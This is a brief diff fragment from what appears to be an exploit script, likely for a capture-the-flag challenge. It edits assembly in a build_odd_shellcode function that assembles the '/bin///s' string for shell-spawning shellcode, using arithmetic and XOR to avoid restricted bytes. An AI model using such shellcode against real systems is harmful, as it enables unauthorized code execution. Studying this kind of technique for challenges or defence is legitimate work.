@@ -28,8 +28,6 @@ def build_odd_shellcode():
        push r15
 
        /* push 0x732f2f2f6e69622f */
-       /*  0x732f2f2f5f686331* /
-       /*  0x0000000000010000*/
        mov r11, ((0x732f2f2f6e69622f-0xffeffff)^0x01010101)
        xor r11, 0x01010101
        add r11, (0xffeffff)/2
